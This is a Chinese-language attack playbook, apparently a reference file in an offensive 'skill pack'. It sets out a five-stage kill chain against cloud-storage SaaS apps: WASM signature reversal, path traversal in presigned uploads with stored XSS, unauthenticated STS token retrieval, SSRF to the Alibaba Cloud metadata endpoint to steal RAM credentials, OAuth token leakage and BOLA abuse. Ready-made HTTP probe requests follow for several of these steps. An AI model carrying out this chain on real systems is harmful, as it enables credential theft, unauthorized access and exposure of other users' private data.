# WASM 前端签名逆向与云存储 SaaS · 5 阶段突破链与脱敏证据案例库

> 本文档为 `wasm-cloud-saas-tactics` 技能包支撑文件（`references/attack-chains-and-pocs.md`），汇总从前端 WASM 逆向、云存储目录穿越、全回显 SSRF 云凭证窃取到认证/BOLA 穿透的完整攻击链与脱敏探针模板。

---

## 1. 五阶段纵深杀伤链（Kill Chain）

```text
[阶段 1: 前端静态资产盘点与 WASM 签名算法逆向]
  定位 crypto_util_bg.*.wasm -> wasm2wat 提取盐值与参数顺序 -> 还原本地签名生成脚本
        │
        ▼
[阶段 2: 预签名上传目录穿越与未授权 STS 令牌获取]
  调用 POST /api/v1/upload/sign-url 注入 biz: "../../../deploy"
  配合 --path-as-is 原始未归一化路径 PUT 覆盖任意 OSS 对象 + 上传同源 HTML/SVG 触发存储型 XSS
  同时调用未授权 GET /api/v1/oss/sts-token 直接获取 OSS STS 临时写权限
        │
        ▼
[阶段 3: 全回显 SSRF 转存通道窃取阿里云 Kubernetes Worker RAM 凭证]
  POST /api/v2/upload-screenshot (uploaded_screen_shot_url)
  将 http://100.100.100.200/latest/meta-data/ram/security-credentials/<Role> 镜像至公网 OSS 读取完整 STS 凭证
        │
        ▼
[阶段 4: 认证令牌设计缺陷与 OAuth 跨窗口令牌劫持]
  解码注册激活/密码重置邮件链接 JWT 发现内嵌明文 password 与 argon2id 哈希
  审计 /auth/callback 发现 window.opener.postMessage(..., "*") 跨源泄露 OAuth Token
        │
        ▼
[阶段 5: 核心业务流 BOLA 越权矩阵与跨用户存储型 XSS]
  /api/v2/chat/agent-stream/continue 跨会话越权续传
  /api/v2/share 遍历递增 content_id 强制公开任意私有笔记
  /api/v2/notes/shared 导入未净化共享笔记触发 /detail/<id> 跨用户存储型 XSS
```

---

## 2. 关键漏洞验证探针模板（已脱敏）

### 2.1 WASM 签名还原后调用预签名目录穿越探针

```http
POST /api/v1/upload/sign-url HTTP/1.1
Host: target-saas.example
Content-Type: application/json

{
  "biz": "../../../deploy",
  "file_type": "text/plain",
  "filename": "audit-check.txt",
  "nonce": "a1b2c3d4",
  "t": 1700000000,
  "s": "<MD5_FROM_REVERSED_WASM>"
}
```

### 2.2 未授权直接获取阿里云 OSS STS 临时凭证探针

```http
GET /api/v1/oss/sts-token HTTP/1.1
Host: target-saas.example
Accept: application/json
```

### 2.3 跨用户会话续传与私有笔记强制公开 BOLA 探针

```http
POST /api/v2/chat/agent-stream/continue HTTP/1.1
Host: target-saas.example
Authorization: Bearer [测试账号A_TOKEN]
Content-Type: application/json

{
  "conversation_id": "<测试账号B_CONVERSATION_ID>",
  "message_id": "<测试账号B_MESSAGE_ID>"
}
```

```http
POST /api/v2/share HTTP/1.1
Host: target-saas.example
Authorization: Bearer [测试账号A_TOKEN]
Content-Type: application/json

{
  "content_id": 100042,
  "share_type": 1
}
```
